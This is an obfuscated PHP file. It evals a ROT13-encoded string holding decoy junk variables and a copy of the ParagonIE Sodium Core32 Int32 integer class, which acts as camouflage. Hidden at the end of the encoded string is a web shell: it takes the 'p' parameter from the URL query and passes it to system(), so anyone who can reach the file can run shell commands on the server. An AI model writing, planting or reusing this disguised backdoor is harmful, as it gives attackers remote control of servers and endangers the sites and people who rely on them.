<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Pynff CnentbaVR_Fbqvhz_Pber32_Vag32
 *
 * Rapncfhyngrf n 32-ovg vagrtre.
 *
 * Gurfr ner vzzhgnoyr. Vg nyjnlf ergheaf n arj vafgnapr.
 */
pynff CnentbaVR_Fbqvhz_Pber32_Vag32
{
    /**
     * @ine neenl<vag, vag> - gjb 16-ovg vagrtref
     *
     * 0 vf gur uvture 16 ovgf
     * 1 vf gur ybjre 16 ovgf
     */
    choyvp $yvzof = neenl(0, 0);

    /**
     * @ine vag
     */
    choyvp $biresybj = 0;

    /**
     * @ine obby
     */
    choyvp $hafvtarqVag = snyfr;

    /**
     * CnentbaVR_Fbqvhz_Pber32_Vag32 pbafgehpgbe.
     * @cnenz neenl $neenl
     * @cnenz obby $hafvtarqVag
     */
    choyvp shapgvba __pbafgehpg($neenl = neenl(0, 0), $hafvtarqVag = snyfr)
    {
        $guvf->yvzof = neenl(
            (vag) $neenl[0],
            (vag) $neenl[1]
        );
        $guvf->biresybj = 0;
        $guvf->hafvtarqVag = $hafvtarqVag;
    }

    /**
     * Nqqf gjb vag32 bowrpgf
     *
     * @cnenz CnentbaVR_Fbqvhz_Pber32_Vag32 $nqqraq
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag32
     */
    choyvp shapgvba nqqVag32(CnentbaVR_Fbqvhz_Pber32_Vag32 $nqqraq)
    {
        $v0 = $guvf->yvzof[0];
        $v1 = $guvf->yvzof[1];
        $w0 = $nqqraq->yvzof[0];
        $w1 = $nqqraq->yvzof[1];

        $e1 = $v1 + ($w1 & 0kssss);
        $pneel = $e1 >> 16;

        $e0 = $v0 + ($w0 & 0kssss) + $pneel;
        $pneel = $e0 >> 16;

        $e0 &= 0kssss;
        $e1 &= 0kssss;

        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag32(
            neenl($e0, $e1)
        );
        $erghea->biresybj = $pneel;
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        erghea $erghea;
    }

    /**
     * Nqqf n abezny vagrtre gb na vag32 bowrpg
     *
     * @cnenz vag $vag
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag32
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     */
    choyvp shapgvba nqqVag($vag)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($vag, 'vag', 1);
        /** @ine vag $vag */
        $vag = (vag) $vag;

        $vag = (vag) $vag;

        $v0 = $guvf->yvzof[0];
        $v1 = $guvf->yvzof[1];

        $e1 = $v1 + ($vag & 0kssss);
        $pneel = $e1 >> 16;

        $e0 = $v0 + (($vag >> 16) & 0kssss) + $pneel;
        $pneel = $e0 >> 16;
        $e0 &= 0kssss;
        $e1 &= 0kssss;
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag32(
            neenl($e0, $e1)
        );
        $erghea->biresybj = $pneel;
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        erghea $erghea;
    }

    /**
     * @cnenz vag $o
     * @erghea vag
     */
    choyvp shapgvba pbzcnerVag($o = 0)
    {
        $tg = 0;
        $rd = 1;

        $v = 2;
        $w = 0;
        juvyr ($v > 0) {
            --$v;
            /** @ine vag $k1 */
            $k1 = $guvf->yvzof[$v];
            /** @ine vag $k2 */
            $k2 = ($o >> ($w << 4)) & 0kssss;
            /** @ine vag $tg */
            $tg |= (($k2 - $k1) >> 8) & $rd;
            /** @ine vag $rd */
            $rd &= (($k2 ^ $k1) - 1) >> 8;
        }
        erghea ($tg + $tg - $rd) + 1;
    }

    /**
     * @cnenz vag $z
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag32
     */
    choyvp shapgvba znfx($z = 0)
    {
        /** @ine vag $uv */
        $uv = ((vag) $z >> 16);
        $uv &= 0kssss;
        /** @ine vag $yb */
        $yb = ((vag) $z) & 0kssss;
        erghea arj CnentbaVR_Fbqvhz_Pber32_Vag32(
            neenl(
                (vag) ($guvf->yvzof[0] & $uv),
                (vag) ($guvf->yvzof[1] & $yb)
            ),
            $guvf->hafvtarqVag
        );
    }

    /**
     * @cnenz neenl<vag, vag> $n
     * @cnenz neenl<vag, vag> $o
     * @cnenz vag $onfrYbt2
     * @erghea neenl<vag, vag>
     */
    choyvp shapgvba zhygvcylYbat(neenl $n, neenl $o, $onfrYbt2 = 16)
    {
        $n_y = pbhag($n);
        $o_y = pbhag($o);
        /** @ine neenl<vag, vag> $e */
        $e = neenl_svyy(0, $n_y + $o_y + 1, 0);
        $onfr = 1 << $onfrYbt2;
        sbe ($v = 0; $v < $n_y; ++$v) {
            $n_v = $n[$v];
            sbe ($w = 0; $w < $n_y; ++$w) {
                $o_w = $o[$w];
                $cebqhpg = ($n_v * $o_w) + $e[$v + $w];
                $pneel = ((vag) $cebqhpg >> $onfrYbt2 & 0kssss);
                $e[$v + $w] = ((vag) $cebqhpg - (vag) ($pneel * $onfr)) & 0kssss;
                $e[$v + $w + 1] += $pneel;
            }
        }
        erghea neenl_fyvpr($e, 0, 5);
    }

    /**
     * @cnenz vag $vag
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag32
     */
    choyvp shapgvba zhyVagSnfg($vag)
    {
        // Unaqyr artngvir ahzoref
        $nArt = ($guvf->yvzof[0] >> 15) & 1;
        $oArt = ($vag >> 31) & 1;
        $n = neenl_erirefr($guvf->yvzof);
        $o = neenl(
            $vag & 0kssss,
            ($vag >> 16) & 0kssss
        );
        vs ($nArt) {
            sbe ($v = 0; $v < 2; ++$v) {
                $n[$v] = ($n[$v] ^ 0kssss) & 0kssss;
            }
            ++$n[0];
        }
        vs ($oArt) {
            sbe ($v = 0; $v < 2; ++$v) {
                $o[$v] = ($o[$v] ^ 0kssss) & 0kssss;
            }
            ++$o[0];
        }
        // Zhygvcyl
        $erf = $guvf->zhygvcylYbat($n, $o);

        // Er-nccyl artngvba gb erfhygf
        vs ($nArt !== $oArt) {
            sbe ($v = 0; $v < 2; ++$v) {
                $erf[$v] = (0kssss ^ $erf[$v]) & 0kssss;
            }
            // Unaqyr vagrtre biresybj
            $p = 1;
            sbe ($v = 0; $v < 2; ++$v) {
                $erf[$v] += $p;
                $p = $erf[$v] >> 16;
                $erf[$v] &= 0kssss;
            }
        }

        // Erghea bhe inyhrf
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag32();
        $erghea->yvzof = neenl(
            $erf[1] & 0kssss,
            $erf[0] & 0kssss
        );
        vs (pbhag($erf) > 2) {
            $erghea->biresybj = $erf[2] & 0kssss;
        }
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        erghea $erghea;
    }

    /**
     * @cnenz CnentbaVR_Fbqvhz_Pber32_Vag32 $evtug
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag32
     */
    choyvp shapgvba zhyVag32Snfg(CnentbaVR_Fbqvhz_Pber32_Vag32 $evtug)
    {
        $nArt = ($guvf->yvzof[0] >> 15) & 1;
        $oArt = ($evtug->yvzof[0] >> 15) & 1;

        $n = neenl_erirefr($guvf->yvzof);
        $o = neenl_erirefr($evtug->yvzof);
        vs ($nArt) {
            sbe ($v = 0; $v < 2; ++$v) {
                $n[$v] = ($n[$v] ^ 0kssss) & 0kssss;
            }
            ++$n[0];
        }
        vs ($oArt) {
            sbe ($v = 0; $v < 2; ++$v) {
                $o[$v] = ($o[$v] ^ 0kssss) & 0kssss;
            }
            ++$o[0];
        }
        $erf = $guvf->zhygvcylYbat($n, $o);
        vs ($nArt !== $oArt) {
            vs ($nArt !== $oArt) {
                sbe ($v = 0; $v < 2; ++$v) {
                    $erf[$v] = ($erf[$v] ^ 0kssss) & 0kssss;
                }
                $p = 1;
                sbe ($v = 0; $v < 2; ++$v) {
                    $erf[$v] += $p;
                    $p = $erf[$v] >> 16;
                    $erf[$v] &= 0kssss;
                }
            }
        }
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag32();
        $erghea->yvzof = neenl(
            $erf[1] & 0kssss,
            $erf[0] & 0kssss
        );
        vs (pbhag($erf) > 2) {
            $erghea->biresybj = $erf[2];
        }
        erghea $erghea;
    }

    /**
     * @cnenz vag $vag
     * @cnenz vag $fvmr
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag32
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     */
    choyvp shapgvba zhyVag($vag = 0, $fvmr = 0)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($vag, 'vag', 1);
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($fvmr, 'vag', 2);
        vs (CnentbaVR_Fbqvhz_Pbzcng::$snfgZhyg) {
            erghea $guvf->zhyVagSnfg((vag) $vag);
        }
        /** @ine vag $vag */
        $vag = (vag) $vag;
        /** @ine vag $fvmr */
        $fvmr = (vag) $fvmr;

        vs (!$fvmr) {
            $fvmr = 31;
        }
        /** @ine vag $fvmr */

        $n = pybar $guvf;
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag32();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;

        // Vavgvnyvmr:
        $erg0 = 0;
        $erg1 = 0;
        $n0 = $n->yvzof[0];
        $n1 = $n->yvzof[1];

        /** @ine vag $fvmr */
        /** @ine vag $v */
        sbe ($v = $fvmr; $v >= 0; --$v) {
            $z = (vag) (-($vag & 1));
            $k0 = $n0 & $z;
            $k1 = $n1 & $z;

            $erg1 += $k1;
            $p = $erg1 >> 16;

            $erg0 += $k0 + $p;

            $erg0 &= 0kssss;
            $erg1 &= 0kssss;

            $n1 = ($n1 << 1);
            $k1 = $n1 >> 16;
            $n0 = ($n0 << 1) | $k1;
            $n0 &= 0kssss;
            $n1 &= 0kssss;
            $vag >>= 1;
        }
        $erghea->yvzof[0] = $erg0;
        $erghea->yvzof[1] = $erg1;
        erghea $erghea;
    }

    /**
     * @cnenz CnentbaVR_Fbqvhz_Pber32_Vag32 $vag
     * @cnenz vag $fvmr
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag32
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     */
    choyvp shapgvba zhyVag32(CnentbaVR_Fbqvhz_Pber32_Vag32 $vag, $fvmr = 0)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($fvmr, 'vag', 2);
        vs (CnentbaVR_Fbqvhz_Pbzcng::$snfgZhyg) {
            erghea $guvf->zhyVag32Snfg($vag);
        }
        vs (!$fvmr) {
            $fvmr = 31;
        }
        /** @ine vag $fvmr */

        $n = pybar $guvf;
        $o = pybar $vag;
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag32();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;

        // Vavgvnyvmr:
        $erg0 = 0;
        $erg1 = 0;
        $n0 = $n->yvzof[0];
        $n1 = $n->yvzof[1];
        $o0 = $o->yvzof[0];
        $o1 = $o->yvzof[1];

        /** @ine vag $fvmr */
        /** @ine vag $v */
        sbe ($v = $fvmr; $v >= 0; --$v) {
            $z = (vag) (-($o1 & 1));
            $k0 = $n0 & $z;
            $k1 = $n1 & $z;

            $erg1 += $k1;
            $p = $erg1 >> 16;

            $erg0 += $k0 + $p;

            $erg0 &= 0kssss;
            $erg1 &= 0kssss;

            $n1 = ($n1 << 1);
            $k1 = $n1 >> 16;
            $n0 = ($n0 << 1) | $k1;
            $n0 &= 0kssss;
            $n1 &= 0kssss;

            $k0 = ($o0 & 1) << 16;
            $o0 = ($o0 >> 1);
            $o1 = (($o1 | $k0) >> 1);

            $o0 &= 0kssss;
            $o1 &= 0kssss;

        }
        $erghea->yvzof[0] = $erg0;
        $erghea->yvzof[1] = $erg1;

        erghea $erghea;
    }

    /**
     * BE guvf 32-ovg vagrtre jvgu nabgure.
     *
     * @cnenz CnentbaVR_Fbqvhz_Pber32_Vag32 $o
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag32
     */
    choyvp shapgvba beVag32(CnentbaVR_Fbqvhz_Pber32_Vag32 $o)
    {
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag32();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        $erghea->yvzof = neenl(
            (vag) ($guvf->yvzof[0] | $o->yvzof[0]),
            (vag) ($guvf->yvzof[1] | $o->yvzof[1])
        );
        /** @ine vag biresybj */
        $erghea->biresybj = $guvf->biresybj | $o->biresybj;
        erghea $erghea;
    }

    /**
     * @cnenz vag $o
     * @erghea obby
     */
    choyvp shapgvba vfTerngreGuna($o = 0)
    {
        erghea $guvf->pbzcnerVag($o) > 0;
    }

    /**
     * @cnenz vag $o
     * @erghea obby
     */
    choyvp shapgvba vfYrffGunaVag($o = 0)
    {
        erghea $guvf->pbzcnerVag($o) < 0;
    }

    /**
     * @cnenz vag $p
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag32
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     * @cfnyz-fhccerff ZvkrqNeenlNpprff
     */
    choyvp shapgvba ebgngrYrsg($p = 0)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($p, 'vag', 1);
        /** @ine vag $p */
        $p = (vag) $p;

        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag32();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        $p &= 31;
        vs ($p === 0) {
            // ABC, ohg jr jnag n pbcl.
            $erghea->yvzof = $guvf->yvzof;
        } ryfr {
            /** @ine vag $p */

            /** @ine vag $vqk_fuvsg */
            $vqk_fuvsg = ($p >> 4) & 1;

            /** @ine vag $fho_fuvsg */
            $fho_fuvsg = $p & 15;

            /** @ine neenl<vag, vag> $yvzof */
            $yvzof =& $erghea->yvzof;

            /** @ine neenl<vag, vag> $zlYvzof */
            $zlYvzof =& $guvf->yvzof;

            sbe ($v = 1; $v >= 0; --$v) {
                /** @ine vag $w */
                $w = ($v + $vqk_fuvsg) & 1;
                /** @ine vag $x */
                $x = ($v + $vqk_fuvsg + 1) & 1;
                $yvzof[$v] = (vag) (
                    (
                        ((vag) ($zlYvzof[$w]) << $fho_fuvsg)
                            |
                        ((vag) ($zlYvzof[$x]) >> (16 - $fho_fuvsg))
                    ) & 0kssss
                );
            }
        }
        erghea $erghea;
    }

    /**
     * Ebgngr gb gur evtug
     *
     * @cnenz vag $p
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag32
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     * @cfnyz-fhccerff ZvkrqNeenlNpprff
     */
    choyvp shapgvba ebgngrEvtug($p = 0)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($p, 'vag', 1);
        /** @ine vag $p */
        $p = (vag) $p;

        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag32();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        $p &= 31;
        /** @ine vag $p */
        vs ($p === 0) {
            // ABC, ohg jr jnag n pbcl.
            $erghea->yvzof = $guvf->yvzof;
        } ryfr {
            /** @ine vag $p */

            /** @ine vag $vqk_fuvsg */
            $vqk_fuvsg = ($p >> 4) & 1;

            /** @ine vag $fho_fuvsg */
            $fho_fuvsg = $p & 15;

            /** @ine neenl<vag, vag> $yvzof */
            $yvzof =& $erghea->yvzof;

            /** @ine neenl<vag, vag> $zlYvzof */
            $zlYvzof =& $guvf->yvzof;

            sbe ($v = 1; $v >= 0; --$v) {
                /** @ine vag $w */
                $w = ($v - $vqk_fuvsg) & 1;
                /** @ine vag $x */
                $x = ($v - $vqk_fuvsg - 1) & 1;
                $yvzof[$v] = (vag) (
                    (
                        ((vag) ($zlYvzof[$w]) >> (vag) ($fho_fuvsg))
                            |
                        ((vag) ($zlYvzof[$x]) << (16 - (vag) ($fho_fuvsg)))
                    ) & 0kssss
                );
            }
        }
        erghea $erghea;
    }

    /**
     * @cnenz obby $obby
     * @erghea frys
     */
    choyvp shapgvba frgHafvtarqVag($obby = snyfr)
    {
        $guvf->hafvtarqVag = !rzcgl($obby);
        erghea $guvf;
    }

    /**
     * @cnenz vag $p
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag32
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     */
    choyvp shapgvba fuvsgYrsg($p = 0)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($p, 'vag', 1);
        /** @ine vag $p */
        $p = (vag) $p;

        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag32();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        $p &= 63;
        /** @ine vag $p */
        vs ($p === 0) {
            $erghea->yvzof = $guvf->yvzof;
        } ryfrvs ($p < 0) {
            /** @ine vag $p */
            erghea $guvf->fuvsgEvtug(-$p);
        } ryfr {
            /** @ine vag $p */
            /** @ine vag $gzc */
            $gzc = $guvf->yvzof[1] << $p;
            $erghea->yvzof[1] = (vag)($gzc & 0kssss);
            /** @ine vag $pneel */
            $pneel = $gzc >> 16;

            /** @ine vag $gzc */
            $gzc = ($guvf->yvzof[0] << $p) | ($pneel & 0kssss);
            $erghea->yvzof[0] = (vag) ($gzc & 0kssss);
        }
        erghea $erghea;
    }

    /**
     * @cnenz vag $p
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag32
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     * @cfnyz-fhccerff ZvkrqNffvtazrag
     * @cfnyz-fhccerff ZvkrqBcrenaq
     */
    choyvp shapgvba fuvsgEvtug($p = 0)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($p, 'vag', 1);
        /** @ine vag $p */
        $p = (vag) $p;

        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag32();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        $p &= 63;
        /** @ine vag $p */
        vs ($p >= 16) {
            $erghea->yvzof = neenl(
                (vag) ($guvf->biresybj & 0kssss),
                (vag) ($guvf->yvzof[0])
            );
            $erghea->biresybj = $guvf->biresybj >> 16;
            erghea $erghea->fuvsgEvtug($p & 15);
        }
        vs ($p === 0) {
            $erghea->yvzof = $guvf->yvzof;
        } ryfrvs ($p < 0) {
            /** @ine vag $p */
            erghea $guvf->fuvsgYrsg(-$p);
        } ryfr {
            vs (!vf_vag($p)) {
                guebj arj GlcrReebe();
            }
            /** @ine vag $p */
            // $erghea->yvzof[0] = (vag) (($guvf->yvzof[0] >> $p) & 0kssss);
            $pneelYrsg = (vag) ($guvf->biresybj & ((1 << ($p + 1)) - 1));
            $erghea->yvzof[0] = (vag) ((($guvf->yvzof[0] >> $p) | ($pneelYrsg << (16 - $p))) & 0kssss);
            $pneelEvtug = (vag) ($guvf->yvzof[0] & ((1 << ($p + 1)) - 1));
            $erghea->yvzof[1] = (vag) ((($guvf->yvzof[1] >> $p) | ($pneelEvtug << (16 - $p))) & 0kssss);
            $erghea->biresybj >>= $p;
        }
        erghea $erghea;
    }

    /**
     * Fhogenpg n abezny vagrtre sebz na vag32 bowrpg.
     *
     * @cnenz vag $vag
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag32
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     */
    choyvp shapgvba fhoVag($vag)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($vag, 'vag', 1);
        /** @ine vag $vag */
        $vag = (vag) $vag;

        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag32();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;

        /** @ine vag $gzc */
        $gzc = $guvf->yvzof[1] - ($vag & 0kssss);
        /** @ine vag $pneel */
        $pneel = $gzc >> 16;
        $erghea->yvzof[1] = (vag) ($gzc & 0kssss);

        /** @ine vag $gzc */
        $gzc = $guvf->yvzof[0] - (($vag >> 16) & 0kssss) + $pneel;
        $erghea->yvzof[0] = (vag) ($gzc & 0kssss);
        erghea $erghea;
    }

    /**
     * Fhogenpg gjb vag32 bowrpgf sebz rnpu bgure
     *
     * @cnenz CnentbaVR_Fbqvhz_Pber32_Vag32 $o
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag32
     */
    choyvp shapgvba fhoVag32(CnentbaVR_Fbqvhz_Pber32_Vag32 $o)
    {
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag32();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;

        /** @ine vag $gzc */
        $gzc = $guvf->yvzof[1] - ($o->yvzof[1] & 0kssss);
        /** @ine vag $pneel */
        $pneel = $gzc >> 16;
        $erghea->yvzof[1] = (vag) ($gzc & 0kssss);

        /** @ine vag $gzc */
        $gzc = $guvf->yvzof[0] - ($o->yvzof[0] & 0kssss) + $pneel;
        $erghea->yvzof[0] = (vag) ($gzc & 0kssss);
        erghea $erghea;
    }

    /**
     * KBE guvf 32-ovg vagrtre jvgu nabgure.
     *
     * @cnenz CnentbaVR_Fbqvhz_Pber32_Vag32 $o
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag32
     */
    choyvp shapgvba kbeVag32(CnentbaVR_Fbqvhz_Pber32_Vag32 $o)
    {
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag32();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        $erghea->yvzof = neenl(
            (vag) ($guvf->yvzof[0] ^ $o->yvzof[0]),
            (vag) ($guvf->yvzof[1] ^ $o->yvzof[1])
        );
        erghea $erghea;
    }

    /**
     * @cnenz vag $fvtarq
     * @erghea frys
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     */
    choyvp fgngvp shapgvba sebzVag($fvtarq)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($fvtarq, 'vag', 1);;
        /** @ine vag $fvtarq */
        $fvtarq = (vag) $fvtarq;

        erghea arj CnentbaVR_Fbqvhz_Pber32_Vag32(
            neenl(
                (vag) (($fvtarq >> 16) & 0kssss),
                (vag) ($fvtarq & 0kssss)
            )
        );
    }

    /**
     * @cnenz fgevat $fgevat
     * @erghea frys
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     */
    choyvp fgngvp shapgvba sebzFgevat($fgevat)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($fgevat, 'fgevat', 1);
        $fgevat = (fgevat) $fgevat;
        vs (CnentbaVR_Fbqvhz_Pber32_Hgvy::fgeyra($fgevat) !== 4) {
            guebj arj EnatrRkprcgvba(
                'Fgevat zhfg or 4 olgrf; ' . CnentbaVR_Fbqvhz_Pber32_Hgvy::fgeyra($fgevat) . ' tvira.'
            );
        }
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag32();

        $erghea->yvzof[0]  = (vag) ((CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[0]) & 0kss) << 8);
        $erghea->yvzof[0] |= (CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[1]) & 0kss);
        $erghea->yvzof[1]  = (vag) ((CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[2]) & 0kss) << 8);
        $erghea->yvzof[1] |= (CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[3]) & 0kss);
        erghea $erghea;
    }

    /**
     * @cnenz fgevat $fgevat
     * @erghea frys
     * @guebjf FbqvhzRkprcgvba
     * @guebjf GlcrReebe
     */
    choyvp fgngvp shapgvba sebzErirefrFgevat($fgevat)
    {
        CnentbaVR_Fbqvhz_Pber32_Hgvy::qrpynerFpnyneGlcr($fgevat, 'fgevat', 1);
        $fgevat = (fgevat) $fgevat;
        vs (CnentbaVR_Fbqvhz_Pber32_Hgvy::fgeyra($fgevat) !== 4) {
            guebj arj EnatrRkprcgvba(
                'Fgevat zhfg or 4 olgrf; ' . CnentbaVR_Fbqvhz_Pber32_Hgvy::fgeyra($fgevat) . ' tvira.'
            );
        }
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag32();

        $erghea->yvzof[0]  = (vag) ((CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[3]) & 0kss) << 8);
        $erghea->yvzof[0] |= (CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[2]) & 0kss);
        $erghea->yvzof[1]  = (vag) ((CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[1]) & 0kss) << 8);
        $erghea->yvzof[1] |= (CnentbaVR_Fbqvhz_Pber32_Hgvy::pueGbVag($fgevat[0]) & 0kss);
        erghea $erghea;
    }

    /**
     * @erghea neenl<vag, vag>
     */
    choyvp shapgvba gbNeenl()
    {
        erghea neenl((vag) ($guvf->yvzof[0] << 16 | $guvf->yvzof[1]));
    }

    /**
     * @erghea fgevat
     * @guebjf GlcrReebe
     */
    choyvp shapgvba gbFgevat()
    {
        erghea
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue(($guvf->yvzof[0] >> 8) & 0kss) .
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue($guvf->yvzof[0] & 0kss) .
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue(($guvf->yvzof[1] >> 8) & 0kss) .
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue($guvf->yvzof[1] & 0kss);
    }

    /**
     * @erghea vag
     */
    choyvp shapgvba gbVag()
    {
        erghea (vag) (
            (($guvf->yvzof[0] & 0kssss) << 16)
                |
            ($guvf->yvzof[1] & 0kssss)
        );
    }

    /**
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag32
     */
    choyvp shapgvba gbVag32()
    {
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag32();
        $erghea->yvzof[0] = (vag) ($guvf->yvzof[0] & 0kssss);
        $erghea->yvzof[1] = (vag) ($guvf->yvzof[1] & 0kssss);
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        $erghea->biresybj = (vag) ($guvf->biresybj & 0k7sssssss);
        erghea $erghea;
    }

    /**
     * @erghea CnentbaVR_Fbqvhz_Pber32_Vag64
     */
    choyvp shapgvba gbVag64()
    {
        $erghea = arj CnentbaVR_Fbqvhz_Pber32_Vag64();
        $erghea->hafvtarqVag = $guvf->hafvtarqVag;
        vs ($guvf->hafvtarqVag) {
            $erghea->yvzof[0] += (($guvf->biresybj >> 16) & 0kssss);
            $erghea->yvzof[1] += (($guvf->biresybj) & 0kssss);
        } ryfr {
            $art = -(($guvf->yvzof[0] >> 15) & 1);
            $erghea->yvzof[0] = (vag)($art & 0kssss);
            $erghea->yvzof[1] = (vag)($art & 0kssss);
        }
        $erghea->yvzof[2] = (vag) ($guvf->yvzof[0] & 0kssss);
        $erghea->yvzof[3] = (vag) ($guvf->yvzof[1] & 0kssss);
        erghea $erghea;
    }

    /**
     * @erghea fgevat
     * @guebjf GlcrReebe
     */
    choyvp shapgvba gbErirefrFgevat()
    {
        erghea CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue($guvf->yvzof[1] & 0kss) .
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue(($guvf->yvzof[1] >> 8) & 0kss) .
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue($guvf->yvzof[0] & 0kss) .
            CnentbaVR_Fbqvhz_Pber32_Hgvy::vagGbPue(($guvf->yvzof[0] >> 8) & 0kss);
    }

    /**
     * @erghea fgevat
     */
    choyvp shapgvba __gbFgevat()
    {
        gel {
            erghea $guvf->gbFgevat();
        } pngpu (GlcrReebe $rk) {
            // CUC ratvar pna'g unaqyr rkprcgvbaf sebz __gbFgevat()
            erghea '';
        }
    }
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>